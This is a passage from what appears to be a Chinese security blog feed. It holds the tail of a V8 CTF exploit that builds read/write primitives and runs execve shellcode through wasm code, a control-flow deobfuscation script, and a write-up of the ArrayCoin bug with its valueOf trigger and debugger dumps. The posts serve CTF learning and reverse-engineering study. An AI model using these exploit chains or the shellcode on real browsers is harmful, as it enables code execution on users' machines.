Int64.fromDouble(oobArray[i]);</span><br><span class="line">    <span class="keyword">if</span>(val == <span class="string">"0x0000123400000000"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        oob_2_backstore_offset = i + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[+] find oob 2 backstore offset is "</span> + oob_2_backstore_offset.toString());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;maxSize;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> val = Int64.fromDouble(oobArray[i]);</span><br><span class="line">    <span class="keyword">if</span>(val == <span class="string">"0x0000dead00000000"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        func_ptr = Sub(Int64.fromDouble(oobArray[i+<span class="number">1</span>]), <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[+] find func ptr is "</span> + func_ptr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oobArray[oob_2_backstore_offset] = addr.asDouble();</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> Int64.fromDouble(arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oobArray[oob_2_backstore_offset] = addr.asDouble();</span><br><span class="line">    oobArray[oob_2_backstore_offset+<span class="number">1</span>] = addr.asDouble();</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf[<span class="number">0</span>]);</span><br><span class="line">    arr.set(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = Sub(read(Add(func_ptr, <span class="number">0x18</span>)), <span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] shared info "</span> + shared_info_addr);</span><br><span class="line"><span class="keyword">var</span> wasm_exported_function_data_addr = Sub(read(Add(shared_info_addr, <span class="number">8</span>)), <span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] wasm_exported_function_data_addr "</span> + wasm_exported_function_data_addr);</span><br><span class="line"><span class="keyword">var</span> code_addr = Sub(read(Add(wasm_exported_function_data_addr, <span class="number">0x72</span>)));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] code_addr "</span> + code_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x50</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xb8</span>, <span class="number">0x2e</span>, <span class="number">0x79</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0x6d</span>, <span class="number">0x62</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x3b</span>, <span class="number">0x31</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x81</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>,</span><br><span class="line">    <span class="number">0x3d</span>, <span class="number">0x50</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x52</span>, <span class="number">0x6a</span>, <span class="number">0x08</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xe2</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x79</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0x6d</span>, <span class="number">0x62</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x56</span>, <span class="number">0x6a</span>, <span class="number">0x08</span>, <span class="number">0x5e</span>, <span class="number">0x48</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0xe6</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] writing shellcode"</span>);</span><br><span class="line"></span><br><span class="line">write(code_addr, shellcode);</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这一题除了分析源代码之外，其他没太大变化……感觉并没有学习到太多新的知识，只是复习了一下……</p>
]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>chrome</tag>
        <tag>v8</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>学习一下去控制流平坦化的脚本</title>
    <url>/2019/10/26/%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8B%E5%8E%BB%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%9A%84%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>来源：<a href="https://github.com/SnowGirls/deflat/blob/master/deflat.py" target="_blank" rel="noopener">Github</a></p>
<p>因为原脚本有些api的使用比较老旧，所以就稍作修改，终于能用了</p>
<a id="more"></a>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> barf.barf <span class="keyword">import</span> BARF</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> pyvex</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_retn_predispatcher</span><span class="params">(cfg)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> main_dispatcher</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> cfg.basic_blocks:</span><br><span class="line">        <span class="keyword">if</span> len(block.branches) == <span class="number">0</span> <span class="keyword">and</span> block.direct_branch == <span class="literal">None</span>:</span><br><span class="line">            retn = block.start_address</span><br><span class="line">        <span class="keyword">elif</span> block.direct_branch == main_dispatcher:</span><br><span class="line">            pre_dispatcher = block.start_address</span><br><span class="line">    <span class="keyword">return</span> retn, pre_dispatcher</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_relevant_nop_blocks</span><span class="params">(cfg)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> pre_dispatcher, prologue, retn</span><br><span class="line">    relevant_blocks = []</span><br><span class="line">    nop_blocks = []</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> cfg.basic_blocks:</span><br><span class="line">        <span class="keyword">if</span> block.direct_branch == pre_dispatcher <span class="keyword">and</span> len(block.instrs) != <span class="number">1</span>:</span><br><span class="line">            relevant_blocks.append(block.start_address)</span><br><span class="line">        <span class="keyword">elif</span> block.start_address != prologue <span class="keyword">and</span> block.start_address != retn:</span><br><span class="line">            nop_blocks.append(block)</span><br><span class="line">    <span class="keyword">return</span> relevant_blocks, nop_blocks</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">statement_inspect</span><span class="params">(state)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> modify_value</span><br><span class="line">    expressions = list(state.scratch.irsb.statements[state.inspect.statement].expressions)</span><br><span class="line">    <span class="keyword">if</span> len(expressions) != <span class="number">0</span> <span class="keyword">and</span> isinstance(expressions[<span class="number">0</span>], pyvex.expr.ITE):</span><br><span class="line">        state.scratch.temps[expressions[<span class="number">0</span>].cond.tmp] = modify_value</span><br><span class="line">        state.inspect._breakpoints[<span class="string">'statement'</span>] = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">symbolic_execution</span><span class="params">(start_addr, hook_addr=None, modify=None, inspect=False)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> b, relevants, modify_value</span><br><span class="line">    <span class="keyword">if</span> hook_addr != <span class="literal">None</span>:</span><br><span class="line">        b.hook(hook_addr, retn_procedure, length=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> modify != <span class="literal">None</span>:</span><br><span class="line">        modify_value = modify</span><br><span class="line">    state = b.factory.blank_state(addr=start_addr, remove_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line">    <span class="keyword">if</span> inspect:</span><br><span class="line">        state.inspect.b(<span class="string">'statement'</span>, when=angr.BP_BEFORE, action=statement_inspect)</span><br><span class="line">    p = b.factory.simgr(state)</span><br><span class="line">    succ=p.step().successors(state)</span><br><span class="line">    <span class="keyword">while</span> succ.successors[<span class="number">0</span>].addr <span class="keyword">not</span> <span class="keyword">in</span> relevants:</span><br><span class="line">        succ=succ.successors[<span class="number">0</span>].step()</span><br><span class="line">    <span class="keyword">return</span> succ.successors[<span class="number">0</span>].addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">retn_procedure</span><span class="params">(state)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> b</span><br><span class="line">    ip = state.se.eval(state.regs.ip)</span><br><span class="line">    b.unhook(ip)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill_nop</span><span class="params">(data, start, end)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> opcode</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start, end):</span><br><span class="line">        data[i] = opcode[<span class="string">'nop'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill_jmp_offset</span><span class="params">(data, start, offset)</span>:</span></span><br><span class="line">    jmp_offset = struct.pack(<span class="string">'&lt;i'</span>, offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        data[start + i] = jmp_offset[i]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list2bytes</span><span class="params">(l)</span>:</span></span><br><span class="line">    data = copy.deepcopy(l)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="keyword">if</span> isinstance(data[i], int):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data[i] = ord(data[i])</span><br><span class="line">    <span class="keyword">return</span> bytes(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        print(<span class="string">'Usage: python deflat.py filename function_address(hex)'</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    opcode = &#123;<span class="string">'a'</span>:<span class="string">'\x87'</span>, <span class="string">'ae'</span>: <span class="string">'\x83'</span>, <span class="string">'b'</span>:<span class="string">'\x82'</span>, <span class="string">'be'</span>:<span class="string">'\x86'</span>, <span class="string">'c'</span>:<span class="string">'\x82'</span>, <span class="string">'e'</span>:<span class="string">'\x84'</span>, <span class="string">'z'</span>:<span class="string">'\x84'</span>, <span class="string">'g'</span>:<span class="string">'\x8F'</span>, </span><br><span class="line">              <span class="string">'ge'</span>:<span class="string">'\x8D'</span>, <span class="string">'l'</span>:<span class="string">'\x8C'</span>, <span class="string">'le'</span>:<span class="string">'\x8E'</span>, <span class="string">'na'</span>:<span class="string">'\x86'</span>, <span class="string">'nae'</span>:<span class="string">'\x82'</span>, <span class="string">'nb'</span>:<span class="string">'\x83'</span>, <span class="string">'nbe'</span>:<span class="string">'\x87'</span>, <span class="string">'nc'</span>:<span class="string">'\x83'</span>,</span><br><span class="line">              <span class="string">'ne'</span>:<span class="string">'\x85'</span>, <span class="string">'ng'</span>:<span class="string">'\x8E'</span>, <span class="string">'nge'</span>:<span class="string">'\x8C'</span>, <span class="string">'nl'</span>:<span class="string">'\x8D'</span>, <span class="string">'nle'</span>:<span class="string">'\x8F'</span>, <span class="string">'no'</span>:<span class="string">'\x81'</span>, <span class="string">'np'</span>:<span class="string">'\x8B'</span>, <span class="string">'ns'</span>:<span class="string">'\x89'</span>,</span><br><span class="line">              <span class="string">'nz'</span>:<span class="string">'\x85'</span>, <span class="string">'o'</span>:<span class="string">'\x80'</span>, <span class="string">'p'</span>:<span class="string">'\x8A'</span>, <span class="string">'pe'</span>:<span class="string">'\x8A'</span>, <span class="string">'po'</span>:<span class="string">'\x8B'</span>, <span class="string">'s'</span>:<span class="string">'\x88'</span>, <span class="string">'nop'</span>:<span class="string">'\x90'</span>, <span class="string">'jmp'</span>:<span class="string">'\xE9'</span>, <span class="string">'j'</span>:<span class="string">'\x0F'</span>&#125;</span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    start = int(sys.argv[<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    barf = BARF(filename)</span><br><span class="line">    base_addr = barf.binary.entry_point &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">12</span></span><br><span class="line">    b = angr.Project(filename, load_options=&#123;<span class="string">'auto_load_libs'</span>: <span class="literal">False</span>, <span class="string">'main_opts'</span>:&#123;<span class="string">'custom_base_addr'</span>: <span class="number">0</span>&#125;&#125;)</span><br><span class="line">    cfg = barf.recover_cfg(start=start)</span><br><span class="line">    blocks = cfg.basic_blocks</span><br><span class="line">    prologue = start</span><br><span class="line">    main_dispatcher = cfg.find_basic_block(prologue).direct_branch</span><br><span class="line">    retn, pre_dispatcher = get_retn_predispatcher(cfg)</span><br><span class="line">    relevant_blocks, nop_blocks = get_relevant_nop_blocks(cfg)</span><br><span class="line">    print(<span class="string">'*******************relevant blocks************************'</span>)</span><br><span class="line">    print(<span class="string">'prologue:%#x'</span> % start)</span><br><span class="line">    print(<span class="string">'main_dispatcher:%#x'</span> % main_dispatcher)</span><br><span class="line">    print(<span class="string">'pre_dispatcher:%#x'</span> % pre_dispatcher)</span><br><span class="line">    print(<span class="string">'retn:%#x'</span> % retn)</span><br><span class="line">    print(<span class="string">'relevant_blocks:'</span>, [hex(addr) <span class="keyword">for</span> addr <span class="keyword">in</span> relevant_blocks])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'*******************symbolic execution*********************'</span>)</span><br><span class="line">    relevants = relevant_blocks</span><br><span class="line">    relevants.append(prologue)</span><br><span class="line">    relevants_without_retn = list(relevants)</span><br><span class="line">    relevants.append(retn)</span><br><span class="line">    flow = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> parent <span class="keyword">in</span> relevants:</span><br><span class="line">        flow[parent] = []</span><br><span class="line">    modify_value = <span class="literal">None</span></span><br><span class="line">    patch_instrs = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> relevant <span class="keyword">in</span> relevants_without_retn:</span><br><span class="line">        print(<span class="string">'-------------------dse %#x---------------------'</span> % relevant)</span><br><span class="line">        block = cfg.find_basic_block(relevant)</span><br><span class="line">        has_branches = <span class="literal">False</span></span><br><span class="line">        hook_addr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> ins <span class="keyword">in</span> block.instrs:</span><br><span class="line">            <span class="keyword">if</span> ins.mnemonic.startswith(<span class="string">'cmov'</span>):</span><br><span class="line">                patch_instrs[relevant] = ins</span><br><span class="line">                has_branches = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> ins.mnemonic.startswith(<span class="string">'call'</span>):</span><br><span class="line">                hook_addr = ins.address</span><br><span class="line">        <span class="keyword">if</span> has_branches:</span><br><span class="line">            flow[relevant].append(symbolic_execution(relevant, hook_addr, claripy.BVV(<span class="number">1</span>, <span class="number">1</span>), <span class="literal">True</span>))</span><br><span class="line">            flow[relevant].append(symbolic_execution(relevant, hook_addr, claripy.BVV(<span class="number">0</span>, <span class="number">1</span>), <span class="literal">True</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flow[relevant].append(symbolic_execution(relevant, hook_addr))</span><br><span class="line">            </span><br><span class="line">    print(<span class="string">'************************flow******************************'</span>)</span><br><span class="line">    <span class="keyword">for</span> (k, v) <span class="keyword">in</span> flow.items():</span><br><span class="line">        print(<span class="string">'%#x:'</span> % k, [hex(child) <span class="keyword">for</span> child <span class="keyword">in</span> v])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'************************patch*****************************'</span>)</span><br><span class="line">    flow.pop(retn)</span><br><span class="line">    origin = open(filename, <span class="string">'rb'</span>)</span><br><span class="line">    origin_data = list(origin.read())</span><br><span class="line">    origin.close()</span><br><span class="line">    recovery = open(filename + <span class="string">'.recovered'</span>, <span class="string">'wb'</span>)</span><br><span class="line">    <span class="keyword">for</span> nop_block <span class="keyword">in</span> nop_blocks:</span><br><span class="line">        fill_nop(origin_data, nop_block.start_address - base_addr, nop_block.end_address - base_addr + <span class="number">1</span>)    </span><br><span class="line">    <span class="keyword">for</span> (parent, childs) <span class="keyword">in</span> flow.items():</span><br><span class="line">        <span class="keyword">if</span> len(childs) == <span class="number">1</span>:</span><br><span class="line">            last_instr = cfg.find_basic_block(parent).instrs[<span class="number">-1</span>]</span><br><span class="line">            file_offset = last_instr.address - base_addr</span><br><span class="line">            origin_data[file_offset] = opcode[<span class="string">'jmp'</span>]</span><br><span class="line">            file_offset += <span class="number">1</span></span><br><span class="line">            fill_nop(origin_data, file_offset, file_offset + last_instr.size - <span class="number">1</span>)</span><br><span class="line">            fill_jmp_offset(origin_data, file_offset, childs[<span class="number">0</span>] - last_instr.address - <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            instr = patch_instrs[parent]</span><br><span class="line">            file_offset = instr.address - base_addr</span><br><span class="line">            fill_nop(origin_data, file_offset, cfg.find_basic_block(parent).end_address - base_addr + <span class="number">1</span>)</span><br><span class="line">            origin_data[file_offset] = opcode[<span class="string">'j'</span>]</span><br><span class="line">            origin_data[file_offset + <span class="number">1</span>] = opcode[instr.mnemonic[<span class="number">4</span>:]]</span><br><span class="line">            fill_jmp_offset(origin_data, file_offset + <span class="number">2</span>, childs[<span class="number">0</span>] - instr.address - <span class="number">6</span>)</span><br><span class="line">            file_offset += <span class="number">6</span></span><br><span class="line">            origin_data[file_offset] = opcode[<span class="string">'jmp'</span>]</span><br><span class="line">            fill_jmp_offset(origin_data, file_offset + <span class="number">1</span>, childs[<span class="number">1</span>] - (instr.address + <span class="number">6</span>) - <span class="number">5</span>)</span><br><span class="line">    origin_data_bytes = list2bytes(origin_data)</span><br><span class="line">    recovery.write(origin_data_bytes)</span><br><span class="line">    recovery.close()</span><br><span class="line">    print(<span class="string">'Successful! The recovered file: %s'</span> % (filename + <span class="string">'.recovered'</span>))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>angr</tag>
        <tag>barf</tag>
      </tags>
  </entry>
  <entry>
    <title>学习v8碰壁(1) 待解决</title>
    <url>/2019/10/25/%E5%AD%A6%E4%B9%A0v8%E7%A2%B0%E5%A3%81-1-%E5%BE%85%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<p>刚做了数字经济线下的chrome，发现了那个问题存在于<code>Builtins_StoreFastElementIC_Standard</code>函数中</p>
<p>似乎是因为某个分支故意触发的错误……</p>
<p>难道是ArrayBuffer的<code>backing_store</code>不能修改两次？</p>
<a id="more"></a>]]></content>
      <categories>
        <category>疑难杂症</category>
      </categories>
      <tags>
        <tag>chrome</tag>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>从0.01学起数字经济线下赛Chrome</title>
    <url>/2019/10/24/%E4%BB%8E0-01%E5%AD%A6%E8%B5%B7%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B%E8%B5%9BChrome/</url>
    <content><![CDATA[<p>头大啊！学了*CTF的oob之后再看数字经济线下的chrome还是不会</p>
<p>但是今天似乎有能把它搞懂的预兆……</p>
<p>题目链接：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E2019/%E7%BA%BF%E4%B8%8B/browser" target="_blank" rel="noopener">Github</a></p>
<p>好困(～﹃～)~zZ</p>
<a id="more"></a>

<h1 id="diff文件"><a href="#diff文件" class="headerlink" title="diff文件"></a>diff文件</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index e6ab965a7e..9e5eb73c34 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"></span><br><span class="line">+// Vulnerability is here</span><br><span class="line">+// You can&apos;t use this vulnerability in Debug Build :)</span><br><span class="line">+BUILTIN(ArrayCoin) &#123;</span><br><span class="line">+  uint32_t len = args.length();</span><br><span class="line">+  if (len != 3) &#123;</span><br><span class="line">+     return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+  &#125;</span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+         isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;Object&gt; value;</span><br><span class="line">+  Handle&lt;Object&gt; length;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));</span><br><span class="line">+</span><br><span class="line">+  uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span><br><span class="line">+  if(37 &lt; array_length)&#123;</span><br><span class="line">+    elements.set(37, value-&gt;Number());</span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();  </span><br><span class="line">+  &#125;</span><br><span class="line">+  else&#123;</span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">   Handle&lt;Object&gt; receiver = args.receiver();</span><br></pre></td></tr></table></figure>

<p>关键之处也就在<code>BUILTIN(ArrayCoin)</code>里面了</p>
<p>流程主要就是，如果参数个数不为3，那么直接返回<code>undefined</code>。它本身有<code>this</code>指针作为一个参数，也就是说我们需要传入两个参数</p>
<p>第一个参数为length，第二个参数为value，如果数组的长度大于37，就会将数组的第37个元素设置为value的值。length目前为止没用</p>
<p>需要注意的是，<code>Object::ToNumber</code>可以通过js中的<code>valueOf</code>发生回调，但是源代码我略微找了一下，没有定位到这一动作的代码(T_T)</p>
<h1 id="漏洞在哪呢？"><a href="#漏洞在哪呢？" class="headerlink" title="漏洞在哪呢？"></a>漏洞在哪呢？</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">len = &#123;</span><br><span class="line">    valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        array.length = <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array = [];</span><br><span class="line">array.length = <span class="number">1</span>;</span><br><span class="line">%DebugPrint(array);</span><br><span class="line">%SystemBreak();</span><br><span class="line">array.coin(len, <span class="number">1</span>);</span><br><span class="line">%DebugPrint(array);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<p>用gdb调试v8，执行上述代码，在第一次break的时候：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x2bc94228bf99 &lt;JSArray[1]&gt;</span><br><span class="line">pwndbg&gt; job 0x2bc94228bf99</span><br><span class="line">0x2bc94228bf99: [JSArray]</span><br><span class="line"> - map: 0x0588c25c2f79 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x10fd0b1517a1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2bc94228c029 &lt;FixedArray[16]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x153d78680c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x367cbd5001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2bc94228c029 &lt;FixedArray[16]&gt; &#123;</span><br><span class="line">        0-15: 0x153d786805b1 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/40gx 0x2bc94228c029-1</span><br><span class="line">0x2bc94228c028:	0x0000153d786807b1	0x0000001000000000</span><br><span class="line">0x2bc94228c038:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c048:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c058:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c068:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c078:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c088:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c098:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c0a8:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c0b8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2bc94228c0c8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2bc94228c0d8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2bc94228c0e8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2bc94228c0f8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2bc94228c108:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2bc94228c118:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2bc94228c128:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2bc94228c138:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2bc94228c148:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2bc94228c158:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>因为v8对数组这些空间不确定的对象都采用的是先分配绝对足量的空间，直到之后使用的时候才会回收不用的空间，所以<code>array.length</code>至少要是1，不能为0，如果为0，那么就不会给elements分配空间（亲测），运行代码就会报错</p>
